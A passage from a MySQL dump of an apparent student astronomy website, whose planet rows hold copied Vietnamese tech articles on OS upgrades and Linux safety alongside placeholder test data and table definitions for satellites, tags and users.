m&atilde;.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>B&agrave;i học r&uacute;t ra</strong>: Kh&ocirc;ng tải v&agrave; chạy đoạn m&atilde; từ website kh&ocirc;ng tin cậy.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Đối với hầu hết c&aacute;c bản ph&acirc;n phối Linux hiện thời, c&aacute;c lệnh n&agrave;y sẽ chỉ được thực thi với quyền root (lệnh sudo), v&igrave; vậy, c&aacute;c d&ograve;ng lệnh c&oacute; thể sẽ c&oacute;&nbsp;<strong>sudo</strong>&nbsp;ở đầu d&ograve;ng. Nếu bạn biết th&ecirc;m những d&ograve;ng lệnh nguy hiểm kh&aacute;c của Linux. H&atilde;y chia sẻ với GeekLinux nh&eacute;.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><em>Nguồn: HowToGeek</em></div>\r\n'),
(2, 'Sao hỏa', '123', '212', '847434', '235', '21', '2324', '789', '456', '45634', '345', '5', '5', '345', '546', '456', '45', '8', '7681', '1678', 'Không', '2014-11-19 14:55:25', '2014-11-28 00:28:49', 'http://localhost/www/aiw2014_astronomy/public/images/planet-1.png', '<div><strong>Cho d&ugrave; bạn c&oacute; đang d&ugrave;ng Windows hay c&aacute;c bản ph&acirc;n phối kh&aacute;c nhau của Linux đi chăng nữa, đa số những người d&ugrave;ng kinh nghiệm đồng t&igrave;nh rằng bạn n&ecirc;n c&agrave;i mới hệ điều h&agrave;nh (hđh) thay v&igrave; thực hiện thao t&aacute;c n&acirc;ng cấp l&ecirc;n phi&ecirc;n bản mới. Sau đ&acirc;y h&atilde;y c&ugrave;ng GeekLinux ph&acirc;n t&iacute;ch nguy&ecirc;n nh&acirc;n dựa tr&ecirc;n 2 hệ điều h&agrave;nh phổ biến Windows v&agrave; Linux.</strong></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2013/04/windows-8-installer.png" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2013/04/windows-8-installer.png" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Việc n&acirc;ng cấp hệ điều h&agrave;nh l&ecirc;n phi&ecirc;n bản mới, v&iacute; dụ từ Windows 7 l&ecirc;n Windows 8, hay Ubuntu 12.04 l&ecirc;n 12.10 r&otilde; r&agrave;ng trở th&agrave;nh vấn đề với những người c&oacute; h&agrave;ng t&aacute; c&ocirc;ng việc li&ecirc;n quan đến chiếc m&aacute;y t&iacute;nh. V&igrave; thế, nh&agrave; sản xuất muốn giảm thiểu tối đa sự phiền h&agrave; của qu&aacute; tr&igrave;nh n&acirc;ng cấp mang lại bằng việc giữ lại dữ liệu người d&ugrave;ng, c&aacute;c thiết đặt, hay c&aacute;c ứng dụng đ&atilde; c&agrave;i. C&aacute;ch n&acirc;ng cấp n&agrave;y mang lại kh&aacute; nhiều rủi ro.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><span style="color:#ff6666; font-size:large">Windows: n&acirc;ng cấp hay c&agrave;i mới?</span></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Trước ti&ecirc;n, ch&uacute;ng ta sẽ n&oacute;i qua về Windows. R&otilde; r&agrave;ng, đối với người d&ugrave;ng &iacute;t kinh nghiệm (như mẹ bạn chẳng hạn), việc thực hiện thao t&aacute;c n&acirc;ng cấp l&agrave; c&aacute;ch dễ d&agrave;ng v&agrave; nhanh ch&oacute;ng nhất. Bạn c&oacute; một m&aacute;y t&iacute;nh chạy Windows 7, v&agrave; khi Windows 8 ra mắt, bạn chỉ cần 1 click chuột v&agrave; ngồi chờ l&agrave; bạn đ&atilde; c&oacute; 1 m&aacute;y t&iacute;nh chạy Windows 8 với đầy đủ c&aacute;c c&aacute;c thiết lập từ windows 7, dữ liệu c&aacute; nh&acirc;n v&agrave; c&aacute;c ứng dụng của bạn.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Về mặt l&yacute; thuyết, thao t&aacute;c n&acirc;ng cấp hđh r&otilde; r&agrave;ng sẽ gi&uacute;p bạn tiết kiệm rất nhiều thời gian v&agrave; c&ocirc;ng sức. Tuy nhi&ecirc;n, mọi thứ lại kh&ocirc;ng đơn giản vậy. Nếu bạn n&acirc;ng cấp, chắc chắn hđh của bạn sẽ kh&ocirc;ng sạch sẽ rồi v&igrave; n&oacute; vẫn giữ nguy&ecirc;n c&agrave;i đặt, dữ liệu c&aacute; nh&acirc;n v&agrave; ứng dụng đ&uacute;ng kh&ocirc;ng? Nhưng thực ra c&ograve;n hơn thế nữa. Việc n&acirc;ng cấp vẫn sẽ giữ lại những tệp tin cũ c&oacute; thể đ&atilde; kh&ocirc;ng được d&ugrave;ng đến h&agrave;ng năm trời, h&agrave;ng đống những thanh ghi địa chỉ (registry entries) do c&aacute;c ứng dụng bạn đ&atilde; từng c&agrave;i vẫn được lưu v&agrave; v&ocirc; số những file r&aacute;c kh&aacute;c nữa. Hơn nữa, kh&ocirc;ng phải tất cả c&aacute;c ứng dụng sẽ tương th&iacute;ch với ph&ecirc;n bản mới của hđh.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Kết quả thử nghiệm tốc độ hệ thống (benchmarks) đ&atilde; chỉ ra rằng, hđh được n&acirc;ng cấp lu&ocirc;n chạy chậm hơn so với hệ điều h&agrave;nh được c&agrave;i mới do hđh n&acirc;ng cấp lu&ocirc;n c&oacute; một số lượng nhất định c&aacute;c ứng dụng v&agrave; dịch vụ (services) chạy ngầm v&agrave; ứng dụng khởi động c&ugrave;ng hệ thống. Ngay cả việc dọn dẹp thanh ghi địa chỉ (register) bằng c&aacute;c phần mềm chuy&ecirc;n dụng cũng kh&ocirc;ng mang lại hiệu quả cao. Hơn nữa, việc n&agrave;y kh&ocirc;ng được khuyến kh&iacute;ch.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2013/04/windows-7-upgrade-vs-custom.png" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2013/04/windows-7-upgrade-vs-custom.png" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><span style="color:#ff6666; font-size:large">N&ecirc;n c&agrave;i đặt mới Windows</span></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Để c&agrave;i đặt mới windows, kh&ocirc;ng lựa chọn t&ugrave;y chọn Upgrade trong qu&aacute; tr&igrave;nh c&agrave;i đặt. Lựa chọn mục Custom: Install Windows only, lựa chọn ph&acirc;n v&ugrave;ng v&agrave; tiến h&agrave;nh c&agrave;i đặt. Thậm ch&iacute;, bạn c&oacute; thể c&agrave;i mối m&aacute;y m&agrave; vẫn giữ th&ocirc;ng tin bản quyền. Lu&ocirc;n nhớ 1 điều, bạn cần sao lưu dữ liệu c&aacute; nh&acirc;n trước khi c&agrave;i đặt v&igrave; c&agrave;i mới sẽ x&oacute;a sạch to&agrave;n bộ dữ liệu tr&ecirc;n ph&acirc;n v&ugrave;ng c&agrave;i đặt.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2013/04/windows-8-upgrade-vs-custom.png" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2013/04/windows-8-upgrade-vs-custom.png" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><span style="color:#ff6666; font-size:large">Đối với Linux.</span></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Tương tự như Windows, việc c&agrave;i mới linux cũng được khuyến kh&iacute;ch thay v&igrave; n&acirc;ng cấp. Trong phần dưới đ&acirc;y, ch&uacute;ng ta sẽ đề cập đến Ubuntu để đại diện cho c&aacute;c bản ph&acirc;n phối Linux kh&aacute;c.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Mark Shuttleworth, người s&aacute;ng lập ra Ubuntu n&oacute;i rằng: &quot;Việc n&acirc;ng cấp Ubuntu r&otilde; r&agrave;ng l&agrave; đơn giản, nhưng để giữ cho hệ thống sạch sẽ v&agrave; ổn định qua c&aacute;c lần n&acirc;ng cấp đ&ograve;i hỏi người d&ugrave;ng phải c&oacute; kiến thức chuy&ecirc;n s&acirc;u về APT (Hệ thống quản l&yacute; ứng dụng tr&ecirc;n Ubutu n&oacute;i ri&ecirc;ng v&agrave; cac distro nền Debian n&oacute;i chung)&quot;.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>N&oacute;i c&aacute;ch kh&aacute;c, việc n&acirc;ng cấp lu&ocirc;n tiềm ẩn những rủi ro. V&iacute; dụ một phi&ecirc;n bản mới của Ubuntu c&oacute; thể bị lược bỏ một số g&oacute;i c&agrave;i đặt sẵn để ph&ugrave; hợp với phi&ecirc;n bản đ&oacute;, tuy nhi&ecirc;n những g&oacute;i đ&oacute; sẽ kh&ocirc;ng được gỡ ra khi n&acirc;ng cấp. C&ograve;n nhiều l&yacute; do kh&aacute;c cản trở qu&aacute; tr&igrave;nh n&acirc;ng cấp hoặc khiến việc n&acirc;ng cấp kh&ocirc;ng được trọn vẹn như c&aacute;c g&oacute;i c&agrave;i đặt từ h&atilde;ng thứ 3, sự phụ thuộc lẫn nhau giữa c&aacute;c thư viện di động, t&ugrave;y chỉnh cũ kh&ocirc;ng tương th&iacute;ch với t&ugrave;y chỉnh mới ... V&agrave; cũng giống như Windows, mọi thứ &quot;r&aacute;c rưởi&quot; vẫn sẽ tồn tại từ phi&ecirc;n cũ sang phi&ecirc;n bản mới, k&eacute;o chậm hệ thống của bạn lại.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2013/04/upgrade-ubuntu.png" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2013/04/upgrade-ubuntu.png" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><span style="color:#ff6666; font-size:large">C&agrave;i mới vẫn lu&ocirc;n được khuyến kh&iacute;ch.</span></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Khi xuất hiện gợi &yacute; n&acirc;ng cấp l&ecirc;n phi&ecirc;n bản mới trong cửa sổ cập nhật, đừng sử dụng. Nếu bạn muốn n&acirc;ng cấp,v&agrave;o trang chủ của bản ph&acirc;n phối bạn đnag d&ugrave;ng, chọn phi&ecirc;n bạn mới nhất, tải về ghi ra đĩa (hoặc USB) để tiến h&agrave;nh c&agrave;i đặt mới. V&agrave; cũng như Windows, sao lưu trước khi c&agrave;i đặt</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2013/04/install-ubuntu.png" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2013/04/install-ubuntu.png" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><span style="color:#ff6666; font-size:large">Nhắc lại về nguy&ecirc;n tắc n&acirc;ng cấp</span></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>N&ecirc;n nhớ rằng bạn chỉ c&oacute; thể n&acirc;ng cấp l&ecirc;n phi&ecirc;n bản mới từ phi&ecirc;n bản trước đ&oacute;. V&iacute; dụ, bạn chỉ c&oacute; thể n&acirc;ng cấp l&ecirc;n WIndows 8 từ Windows 7, kh&ocirc;ng thể n&acirc;ng cấp từ WIndows XP. Tương tự, bạn c&oacute; thể n&acirc;ng cấp l&ecirc;n Ubuntu 12.10 từ Ubuntu 12.04, nhưng kh&ocirc;ng thể l&ecirc;n thẳng từ 11.10.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Ng&agrave;y nay, c&aacute;c nh&agrave; sản xuất hđh lu&ocirc;n t&igrave;m mọi c&aacute;ch để tối ưu nhất c&oacute; thể qu&aacute; tr&igrave;nh n&acirc;ng cấp. Tuy nhi&ecirc;n, việc c&agrave;i mới lu&ocirc;n được khuyến kh&iacute;ch cho d&ugrave; qu&aacute; tr&igrave;nh cập nhật c&oacute; tốt đến đ&acirc;u chăng nữa. Hải tự trải nghiệm v&agrave; cảm nhận bạn nh&eacute;.</div>\r\n'),
(3, 'Sao thuy', 'asdf', 'adf', 'asdf', 'asdf', 'safd', 'saf', 'asd', 'asd', 'dfs', 'asd', 'asd', 'asd', 'fasd', 'asd', 'adsf', 'asd', 'asdf', 'dfg', 'ghj', 'jkl', '2014-12-02 06:44:44', '2014-12-02 06:44:44', 'http://localhost/www/aiw2014_astronomy/public/images/planet-7.png', '<p><strong>klasd asd asd a s</strong></p>\r\n'),
(4, 'Sao Hai Vuong', 'asdf', 'adf', 'asdf', 'asdf', 'safd', 'saf', 'asd', 'asd', 'dfs', 'asd', 'asd', 'asd', 'fasd', 'asd', 'adsf', 'asd', 'asdf', 'dfg', 'ghj', 'jkl', '2014-12-02 06:44:44', '2014-12-02 06:44:44', 'http://localhost/www/aiw2014_astronomy/public/images/planet-6.png', '<p><strong>klasd asd asd a s</strong></p>\r\n');

-- --------------------------------------------------------

--
-- Table structure for table `satellites`
--

CREATE TABLE `satellites` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `planet_id` int(11) DEFAULT NULL,
  `year_discovered` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `discoverer` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `distance_from_planet` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `orbital_period` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `detail` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `avatar` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_satellites_on_planet_id` (`planet_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=3 ;

--
-- Dumping data for table `satellites`
--

INSERT INTO `satellites` (`id`, `planet_id`, `year_discovered`, `discoverer`, `distance_from_planet`, `orbital_period`, `detail`, `created_at`, `updated_at`, `avatar`, `name`) VALUES
(1, 1, '2000 BC', 'Galille', '1200', '1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor ', '2014-11-26 14:27:20', '2014-11-27 15:37:39', '6', 'Mặt trăng'),
(2, 3, 'adsf', 'asdf', 'sdaf', 'sadf', '<p>asd</p>\r\n', '2014-12-02 06:48:22', '2014-12-02 06:48:22', 'http://localhost/www/aiw2014_astronomy/public/images/planet-7.png', 'asdf');

-- --------------------------------------------------------

--
-- Table structure for table `schema_migrations`
--

CREATE TABLE `schema_migrations` (
  `version` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  UNIQUE KEY `unique_schema_migrations` (`version`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `schema_migrations`
--

INSERT INTO `schema_migrations` (`version`) VALUES
('20141101034906'),
('20141101035725'),
('20141101035728'),
('20141118181220'),
('20141119162050'),
('20141126141307'),
('20141126141906'),
('20141126141956'),
('20141126142908'),
('20141128063719'),
('20141128063720'),
('20141129035245'),
('20141129035246'),
('20141129035247'),
('20141129035248');

-- --------------------------------------------------------

--
-- Table structure for table `taggings`
--

CREATE TABLE `taggings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tag_id` int(11) DEFAULT NULL,
  `taggable_id` int(11) DEFAULT NULL,
  `taggable_type` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `tagger_id` int(11) DEFAULT NULL,
  `tagger_type` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `context` varchar(128) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `taggings_idx` (`tag_id`,`taggable_id`,`taggable_type`,`context`,`tagger_id`,`tagger_type`),
  KEY `index_taggings_on_taggable_id_and_taggable_type_and_context` (`taggable_id`,`taggable_type`,`context`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=11 ;

--
-- Dumping data for table `taggings`
--

INSERT INTO `taggings` (`id`, `tag_id`, `taggable_id`, `taggable_type`, `tagger_id`, `tagger_type`, `context`, `created_at`) VALUES
(3, 3, 1, 'Article', NULL, NULL, 'tags', '2014-11-29 14:47:10'),
(4, 4, 1, 'Article', NULL, NULL, 'tags', '2014-11-29 14:47:10'),
(5, 5, 2, 'Article', NULL, NULL, 'tags', '2014-11-29 15:12:49'),
(6, 4, 2, 'Article', NULL, NULL, 'tags', '2014-11-29 15:12:49'),
(7, 6, 3, 'Article', NULL, NULL, 'tags', '2014-11-30 03:24:24'),
(8, 7, 3, 'Article', NULL, NULL, 'tags', '2014-11-30 03:24:24'),
(9, 8, 4, 'Article', NULL, NULL, 'tags', '2014-12-02 06:42:22'),
(10, 9, 4, 'Article', NULL, NULL, 'tags', '2014-12-02 06:42:22');

-- --------------------------------------------------------

--
-- Table structure for table `tags`
--

CREATE TABLE `tags` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `taggings_count` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `index_tags_on_name` (`name`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=10 ;

--
-- Dumping data for table `tags`
--

INSERT INTO `tags` (`id`, `name`, `taggings_count`) VALUES
(1, 'asdasd', 0),
(2, 'asd', 0),
(3, 'traidat', 1),
(4, 'tanthe', 2),
(5, 'conlau', 1),
(6, 'Hola', 1),
(7, 'Pita', 1),
(8, 'baiviet', 1),
(9, 'linhtinh', 1);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '',
  `encrypted_password` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '',
  `reset_password_token` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `reset_password_sent_at` datetime DEFAULT NULL,
  `remember_created_at` datetime DEFAULT NULL,
  `sign_in_count` int(11) NOT NULL DEFAULT '0',
  `current_sign_in_at` datetime DEFAULT NULL,
  `last_sign_in_at` datetime DEFAULT NULL,
  `current_sign_in_ip` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `last_sign_in_ip` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `index_users_on_email` (`email`),
  UNIQUE KEY `index_users_on_reset_password_token` (`reset_password_token`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
